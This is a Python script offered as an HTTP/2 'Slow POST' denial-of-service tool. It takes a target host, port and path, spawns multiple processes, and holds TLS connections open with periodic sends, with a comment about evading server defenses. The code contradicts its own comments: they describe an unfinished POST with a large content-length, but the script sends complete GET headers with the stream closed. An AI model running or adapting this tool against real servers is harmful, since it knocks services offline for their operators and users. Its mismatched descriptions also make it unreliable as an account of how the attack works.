#!/usr/bin/python3
"""
HTTP/2 Slow POST Attack Script
This script initiates multiple processes to perform a Slow POST Denial of Service (DoS) attack over an HTTP/2 connection.
It sends an incomplete HTTP/2 POST request with large content-length but never completes the data transfer,
causing the server to hold resources waiting for the request to finish.

Usage:
    python slowrateDoSattackcompletePOSTheader.py --target <hostname> --port <port> --path <path> --process <number_of_processes> --delay <delay_time>

Arguments:
    -t, --target   : Target hostname or IP address (required)
    -p, --port     : Target port (default: 443)
    --path         : Target path (default: "/")
    -P, --process  : Number of attack processes to spawn (default: 1)
    -d, --delay    : Delay between starting each process in seconds (default: 0.1)
"""

import socket
import ssl
import h2.connection
import h2.events
import argparse
import time
from multiprocessing import Process

def establish_tls_connection(host, port):
    """
    Establishes an SSL/TLS connection to the target server.
    This connection supports HTTP/2 protocol.
    """
    try:
        context = ssl.create_default_context()
        context.set_alpn_protocols(['h2'])  # Specify HTTP/2 as the desired protocol
        sock = socket.create_connection((host, port))
        tls_sock = context.wrap_socket(sock, server_hostname=host)
        return tls_sock
    except Exception as e:
        print(f"Error establishing TLS connection: {e}")
        exit(1)

def send_slow_setting_frame(tls_sock, target, path):
    """
    Sends an incomplete HTTP/2 POST request to the target server, manipulating flags to keep the connection open.
    """
    try:
        # Initialize the HTTP/2 connection
        conn = h2.connection.H2Connection()
        conn.initiate_connection()
        tls_sock.sendall(conn.data_to_send())

        # Prepare the POST headers
        headers = [
            (':method', 'GET'),
            (':authority', target),
            (':scheme', 'https'),
            (':path', path)
        ]

        # Send HEADERS frame with END_HEADERS set and END_STREAM unset
        stream_id = conn.get_next_available_stream_id()
        
        conn.send_headers(stream_id, headers, end_stream=True)
        tls_sock.sendall(conn.data_to_send())

        print(f"Complete headers sent.")

        # Loop to keep the connection open without sending data (simulating a Slow POST)
        while True:
            # Send data in a low, steady rate to avoid triggering server's defenses
            time.sleep(5)
            
            tls_sock.sendall(conn.data_to_send())

    except Exception as e:
        print(f"Error during the attack: {e}")
    finally:
        conn.close_connection()
        tls_sock.sendall(conn.data_to_send())
        tls_sock.close()

def main():
    """
    Main function to perform the HTTP/2 Slow POST attack. It establishes a connection and sends incomplete POST requests.
    """
    # Establish a secure TLS connection
    tls_sock = establish_tls_connection(args.target, args.port)
    
    # Send the slow POST request
    send_slow_setting_frame(tls_sock, args.target, args.path)

if __name__ == "__main__":
    # Argument parsing for command-line options
    parser = argparse.ArgumentParser(description="Perform a Slow POST attack over HTTP/2.")
    parser.add_argument('-t', '--target', type=str, required=True, help="Target hostname or IP address.")
    parser.add_argument('-p', '--port', type=int, default=443, help="Target port (default: 443).")
    parser.add_argument('--path', type=str, default="/", help="Target path (default: '/').")
    parser.add_argument('-P', '--process', type=int, default=1, help="Number of processes to spawn (default: 1).")
    parser.add_argument('-d', '--delay', type=float, default=0.1, help="Delay between spawning processes in seconds (default: 0.1).")

    args = parser.parse_args()

    # List to hold process objects
    process_list = []

    # Spawn the specified number of processes
    for i in range(args.process):
        # Create a new process targeting the main attack function
        process = Process(target=main, daemon=True)
        process_list.append(process)
        process.start()

        # Delay between starting each process to control the load on the server
        time.sleep(args.delay)

    # Join the processes to wait for their completion
    for process in process_list:
        if process.is_alive():
            process.join()
